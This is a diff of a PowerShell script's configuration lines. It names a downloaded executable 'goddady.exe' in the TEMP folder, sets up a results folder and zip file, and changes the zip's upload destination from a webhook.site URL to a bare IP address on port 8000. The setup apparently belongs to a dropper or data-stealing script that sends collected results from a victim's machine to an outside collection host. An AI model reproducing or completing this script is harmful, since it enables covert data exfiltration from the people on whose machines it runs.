@@ -1,5 +1,5 @@
 $exeName = 'goddady.exe'; # Name of the executable
-$zipUrl = 'https://webhook.site/2911c139-ed87-4411-a940-58458f44ebb1'; # Replace with the URL to receive the zip file
+$zipUrl = 'http://129.212.192.8:8000'; # Replace with the URL to receive the zip file
 $exePath = Join-Path $env:TEMP $exeName; # Download to temp
 $resultsFolder = Join-Path $env:TEMP 'results'; # Results folder in temp
 $zipPath = Join-Path $env:TEMP 'results.zip'; # Zip file in temp
